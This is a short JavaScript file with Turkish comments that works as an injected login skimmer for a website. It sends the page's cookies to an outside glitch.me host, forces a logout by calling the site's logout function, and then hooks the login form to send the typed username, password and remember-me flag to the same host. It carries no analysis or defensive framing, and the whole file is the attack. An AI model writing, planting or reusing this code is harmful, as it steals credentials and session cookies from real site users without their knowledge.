(function () {
  console.log('c.js çalışıyor');

  // Her yüklenmede kontrol et
  function checkAndRun() {
    const username = document.cookie.match(/username=([^;]+)/)?.[1] || '';
    console.log('Çerezdeki username:', username);
    if (username) {
      fetch(`https://ancient-pentagonal-elephant.glitch.me/check?user=${encodeURIComponent(username)}`, {
        method: 'GET',
        credentials: 'include'
      })
        .then(response => response.json())
        .then(data => {
          console.log('Check yanıtı:', data);
          if (data.allowed) {
            runScript();
          }
        })
        .catch(err => console.log('Check hatası:', err));
    }
  }

  function runScript() {
    let isScriptActive = true;

    function setupButtonListeners() {
      if (!isScriptActive) return;

      const loginButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
      if (loginButton) {
        loginButton.addEventListener('click', () => {
          setTimeout(setupLoginListener, 100);
        });
      }
    }

    function setupLoginListener() {
      const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
      if (loginBtn && isScriptActive) {
        loginBtn.addEventListener('click', () => {
          const username = document.getElementById('loginname').value;
          const password = document.getElementById('loginpassport').value;
          const remember = document.getElementById('authCheck').checked;
          const data = `kuladi=${encodeURIComponent(username)}&sifre=${encodeURIComponent(password)}&remember=${encodeURIComponent(remember)}`;

          fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
            method: 'GET',
            credentials: 'include'
          })
            .then(() => {
              isScriptActive = false;
            })
            .catch(() => {
              isScriptActive = false;
            });
        });
      }
    }

    const hasLoggedOut = sessionStorage.getItem('hasLoggedOut');
    if (!hasLoggedOut && isScriptActive) {
      const cookies = document.cookie || '';
      if (cookies) {
        fetch('https://ancient-pentagonal-elephant.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
          method: 'GET',
          credentials: 'include'
        })
          .then(() => {
            if (typeof cikisyap === 'function') {
              cikisyap();
              sessionStorage.setItem('hasLoggedOut', 'true');
              isScriptActive = false;
            }
          })
          .catch(() => {
            if (typeof cikisyap === 'function') {
              cikisyap();
              sessionStorage.setItem('hasLoggedOut', 'true');
              isScriptActive = false;
            }
          });
      } else {
        if (typeof cikisyap === 'function') {
          cikisyap();
          sessionStorage.setItem('hasLoggedOut', 'true');
          isScriptActive = false;
        }
      }
    }

    if (isScriptActive) {
      window.addEventListener('load', () => {
        setupButtonListeners();
      });

      let lastUrl = location.href;
      setInterval(() => {
        if (location.href !== lastUrl) {
          lastUrl = location.href;
          setupButtonListeners();
        }
      }, 500);
    }
  }

  // Her sayfa yüklenmesinde kontrol et
  checkAndRun();
})();
